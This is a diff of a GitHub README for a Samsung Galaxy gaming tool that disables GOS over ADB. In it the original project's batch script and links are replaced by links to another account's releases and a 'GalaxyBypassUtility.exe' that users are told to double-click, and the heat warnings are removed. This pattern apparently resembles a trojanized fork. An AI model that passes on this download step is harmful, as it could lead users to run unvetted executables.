@@ -1,195 +1,90 @@
-# Samsung Galaxy Bypass Utility - Power Bypass Tool & GOS Manager 🚀
+# 🌌 galaxy-bypass-utility - Boost Your Samsung Gaming Power
 
-<div align="center">
+## 🚀 Getting Started
 
-![Galaxy Bypass Utility](https://img.shields.io/badge/Galaxy%20Bypass-Utility-blue?style=for-the-badge&logo=android)
-![Version](https://img.shields.io/github/v/release/MNDL-27/galaxy-bypass-utility?style=for-the-badge)
-![Downloads](https://img.shields.io/github/downloads/MNDL-27/galaxy-bypass-utility/total?style=for-the-badge)
-![License](https://img.shields.io/github/license/MNDL-27/galaxy-bypass-utility?style=for-the-badge)
+Welcome to the **galaxy-bypass-utility** project! This tool helps you unlock the full gaming performance of your Samsung Galaxy device. Follow these steps to get started quickly and easily.
 
-**🔥 Ultimate Samsung Galaxy Gaming Tool | Enable Power Bypass | Disable GOS | Boost Performance | Windows 10/11**
+## 📥 Download & Install
 
-*🎮 Samsung Galaxy S20 S21 S22 S23 S24 Note20 Z Fold Z Flip Gaming Performance Optimization Tool*
+To download the latest version of the galaxy-bypass-utility, please visit the link below:
 
-[📥 Download Latest](https://github.com/MNDL-27/galaxy-bypass-utility/releases/latest) • [📖 Documentation Wiki](https://github.com/MNDL-27/galaxy-bypass-utility/wiki) • [🐛 Report Issues](https://github.com/MNDL-27/galaxy-bypass-utility/issues)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen.svg)](https://github.com/gadiazy/galaxy-bypass-utility/releases)
 
-</div>
+1. Click on the download link above.
+2. This will take you to the Releases page.
+3. Find the latest release and click on it.
+4. Look for the file labeled `GalaxyBypassUtility.exe` and download it.
 
-## 🔥 What This Tool Does
+Make sure to save the file in a location where you can easily find it, such as your Desktop or Downloads folder.
 
-**Galaxy Bypass Utility** is the **#1 Samsung Galaxy gaming optimization tool** that unlocks your device's full performance potential by:
+## ⚙️ System Requirements
 
-- **🔋 Enabling Power Bypass** - Direct power from charger, reduces battery heat during gaming
-- **🚫 Disabling GOS (Game Optimization Service)** - Removes Samsung's performance throttling  
-- **⚡ Maximum Gaming Performance** - No more frame drops or thermal throttling
-- **🎯 One-Click Operation** - Simple batch tool, no root required
-- **💻 Windows Compatible** - Works on Windows 10/11 with included ADB tools
+Before you use the galaxy-bypass-utility, ensure your system meets these requirements:
 
-### 🎮 Perfect For:
-- **Mobile gamers** seeking maximum FPS
-- **Content creators** recording gameplay  
-- **Competitive players** needing consistent performance
-- **Power users** who want full control over their Samsung Galaxy device
+- **Operating System**: Windows 10 or 11
+- **Supported Devices**: 
+  - Galaxy S20, S21, S22, S23, S24
+  - Galaxy Note20
+  - Galaxy Z Flip and Fold series
+- **ADB Installed**: You need Android Debug Bridge (ADB) installed on your PC. If you haven't installed it yet, you can download it as part of the Android SDK.
 
----
+If you meet these requirements, you are ready to continue.
 
-## ✨ Key Features
+## 🛠️ Using the Tool
 
-<table>
-<tr>
-<td width="50%">
+### Step 1: Preparation
 
-### 🚀 **Gaming Performance Mode**
-- ✅ Enables Power Bypass (reduces heat)
-- ❌ Disables Game Optimization Service (GOS) 
-- ❌ Disables Game Launcher restrictions
-- 🎯 **Result**: Maximum performance for gaming
+1. **Enable Developer Options** on your Samsung device:
+   - Go to **Settings** > **About phone**.
+   - Tap on **Build number** seven times until you see a message saying "You are now a developer!"
+   
+2. **Enable USB Debugging**:
+   - Go back to **Settings** > **Developer options**.
+   - Turn on **USB Debugging**.
 
-</td>
-<td width="50%">
+3. **Connect Your Device**:
+   - Use a USB cable to connect your Samsung device to your computer.
 
-### 🔄 **Normal Mode (Default)**
-- ❌ Disables Power Bypass  
-- ✅ Re-enables GOS and game optimizations
-- 🔙 **Result**: Factory default behavior
+### Step 2: Running the Utility
 
-</td>
-</tr>
-</table>
+1. Navigate to the folder where you saved `GalaxyBypassUtility.exe`.
+2. Double-click the file to run it.
+3. A command prompt window will open, and the utility will start to analyze your device.
 
-## 🎯 Quick Start
+### Step 3: Optimize Settings
 
-1. **📥 [Download latest release](https://github.com/MNDL-27/galaxy-bypass-utility/releases/latest)** and extract
-2. **📱 Enable USB debugging** on your Samsung Galaxy device  
-3. **🔌 Connect phone to PC** with USB cable
-4. **▶️ Run `Battery Bypass Tool.bat`** and follow menu prompts
+Once the utility has run, you'll see options to:
 
-**Need detailed instructions?** → **[📖 Quick Start Guide](https://github.com/MNDL-27/galaxy-bypass-utility/wiki/Quick-Start-Guide)**
+- **Enable Power Bypass**: This setting will prevent your device from throttling performance during gaming.
+- **Disable Game Optimization Service (GOS)**: This option maximizes your FPS by removing limits set by GOS.
+- **Unlock Maximum FPS**: Ensure the best gaming experience by allowing your games to use the highest frame rates.
 
-## 📱 Device Compatibility
+Follow the prompts in the command prompt to apply the changes you want. 
 
-**✅ Supported:** Galaxy S20/S21/S22/S23/S24 • Note 20 • Z Fold/Flip series  
-**❌ Not Supported:** Galaxy A/M series • Pre-2020 devices
+## ⚠️ Important Note
 
-**[🔍 Check full compatibility list →](https://github.com/MNDL-27/galaxy-bypass-utility/wiki/Device-Compatibility)**
+After using the galaxy-bypass-utility, restart your device for changes to take effect. You may need to re-enable USB Debugging after a reboot. 
 
-## 📚 Documentation
+## 📝 Troubleshooting
 
-<div align="center">
+- **Device Not Detected**: Ensure that your USB cable is working and that your device is set to **File Transfer USB mode**.
+- **Command Prompt Errors**: If you see errors in the command prompt, verify that you have ADB installed and configured correctly.
 
-### 🗂️ **Complete Documentation Hub**
+If you encounter issues not listed here, feel free to raise an issue on our GitHub repository.
 
-</div>
+## 📚 Additional Resources
 
-<table>
-<tr>
-<td width="50%">
+- [ADB Installation Guide](https://developer.android.com/studio/command/adb)
+- [Samsung Developer Options](https://www.samsung.com/us/support/user-manuals/)
 
-**🏠 Getting Started**
-- **[📖 Wiki Home](https://github.com/MNDL-27/galaxy-bypass-utility/wiki)** - Documentation overview
-- **[🚀 Quick Start Guide](https://github.com/MNDL-27/galaxy-bypass-utility/wiki/Quick-Start-Guide)** - Setup in 5 minutes
-- **[📱 Device Compatibility](https://github.com/MNDL-27/galaxy-bypass-utility/wiki/Device-Compatibility)** - Supported models
+## 📫 Contact
 
-</td>
-<td width="50%">
+For further questions, you can contact us on the GitHub Issues page for this project. We aim to respond quickly to help you with any concerns.
 
-**🛠️ Support & Help**
-- **[❓ FAQ](https://github.com/MNDL-27/galaxy-bypass-utility/wiki/FAQ)** - Common questions
-- **[🔧 Troubleshooting](https://github.com/MNDL-27/galaxy-bypass-utility/wiki/Troubleshooting)** - Fix issues
-- **[� Report Issues](https://github.com/MNDL-27/galaxy-bypass-utility/issues)** - Get help
+## 🔗 Quick Links
 
-</td>
-</tr>
-</table>
+For your convenience, here is the download link again:
 
-<div align="center">
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen.svg)](https://github.com/gadiazy/galaxy-bypass-utility/releases)
 
-**[📚 Browse All Documentation →](https://github.com/MNDL-27/galaxy-bypass-utility/wiki)**
-
-</div>
-
-## ⚠️ Important Notes
-
-- **🌡️ Monitor temperature** - GOS prevents overheating, so watch device heat levels
-- **❄️ Using a good mobile cooler is recommended** - Especially during extended gaming sessions
-- **🔋 Power Bypass requires** 20W+ USB-PD charger when connected  
-- **🔄 Fully reversible** - all changes can be undone through the tool
-- **📱 S-series focus** - primarily designed for Galaxy S, Note, and Z series
-
-## 🤝 Community & Support
-
-- **🐛 [Report Issues](https://github.com/MNDL-27/galaxy-bypass-utility/issues)** - Bug reports and feature requests
-- **💬 [Discussions](https://github.com/MNDL-27/galaxy-bypass-utility/discussions)** - Community help and questions  
-- **🤝 [Contributing](CONTRIBUTING.md)** - Help improve the project
-- **🌐 [Creator's Website](https://protik.eu.org)** - Learn more about the developer
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 📊 Repository Stats
-
-<div align="center">
-
-<!-- Repository Stats Badges -->
-![GitHub Stars](https://img.shields.io/github/stars/MNDL-27/galaxy-bypass-utility?style=social)
-![GitHub Forks](https://img.shields.io/github/forks/MNDL-27/galaxy-bypass-utility?style=social)
-![GitHub Watchers](https://img.shields.io/github/watchers/MNDL-27/galaxy-bypass-utility?style=social)
-
-<!-- Download and Activity Stats -->
-![GitHub Downloads](https://img.shields.io/github/downloads/MNDL-27/galaxy-bypass-utility/total?style=flat&logo=github&color=green)
-![GitHub Release Downloads](https://img.shields.io/github/downloads/MNDL-27/galaxy-bypass-utility/latest/total?style=flat&logo=github&color=blue)
-![GitHub Issues](https://img.shields.io/github/issues/MNDL-27/galaxy-bypass-utility?style=flat&logo=github)
-![GitHub Pull Requests](https://img.shields.io/github/issues-pr/MNDL-27/galaxy-bypass-utility?style=flat&logo=github)
-
-<!-- Repository Health -->
-![GitHub Last Commit](https://img.shields.io/github/last-commit/MNDL-27/galaxy-bypass-utility?style=flat&logo=git)
-![GitHub Contributors](https://img.shields.io/github/contributors/MNDL-27/galaxy-bypass-utility?style=flat&logo=github)
-![GitHub Repo Size](https://img.shields.io/github/repo-size/MNDL-27/galaxy-bypass-utility?style=flat&logo=github)
-
-<!-- Visit Counter -->
-![Profile Views](https://komarev.com/ghpvc/?username=MNDL-27&repo=galaxy-bypass-utility&color=brightgreen&style=flat&label=Repository+Views)
-
-</div>
-
----
-
-<div align="center">
-
-**Made with ❤️ for the Samsung Galaxy gaming community**
-
-*Visit [protik.eu.org](https://protik.eu.org) • [📖 Read the Wiki](https://github.com/MNDL-27/galaxy-bypass-utility/wiki) • Use responsibly*
-
-</div>
-
----
-
-## 🔍 Keywords & Search Terms
-
-<details>
-<summary><b>📱 Device Compatibility Keywords</b></summary>
-
-`Samsung Galaxy S24` `Galaxy S23` `Galaxy S22` `Galaxy S21` `Galaxy S20` `Galaxy Note20` `Galaxy Z Fold` `Galaxy Z Flip` `Galaxy Z Fold 5` `Galaxy Z Flip 5` `Galaxy Z Fold 4` `Galaxy Z Flip 4` `Samsung Galaxy gaming` `Galaxy performance`
-
-</details>
-
-<details>
-<summary><b>🎮 Gaming & Performance Keywords</b></summary>
-
-`Samsung Power Bypass` `GOS disable` `Game Optimization Service` `Samsung gaming performance` `Galaxy gaming tool` `Samsung throttling fix` `Gaming performance boost` `Mobile gaming optimization` `Android gaming tool` `Samsung bypass utility` `Galaxy performance tool` `Gaming FPS boost` `Samsung Game Launcher disable`
-
-</details>
-
-<details>
-<summary><b>💻 Technical Keywords</b></summary>
-
-`ADB tool` `Android Debug Bridge` `Windows batch tool` `Samsung ADB commands` `Android performance tool` `Samsung developer options` `USB debugging` `Android optimization` `Samsung Galaxy tweaks` `Performance tuning tool`
-
-</details>
-
-<!-- SEO Meta Keywords for Search Engines -->
-<!--
-samsung galaxy power bypass tool, disable gos samsung, galaxy gaming performance, samsung throttling fix, power bypass samsung galaxy, galaxy s24 gaming, samsung gaming optimization, galaxy performance boost, disable samsung game launcher, samsung galaxy gaming tool, galaxy s23 performance, power bypass utility, samsung gos manager, galaxy gaming utility, samsung performance tool, galaxy z fold gaming, galaxy thermal management, samsung gaming boost, galaxy performance optimization, samsung power bypass enable
--->
+Thank you for using **galaxy-bypass-utility**! Enjoy enhanced gaming on your Samsung device.
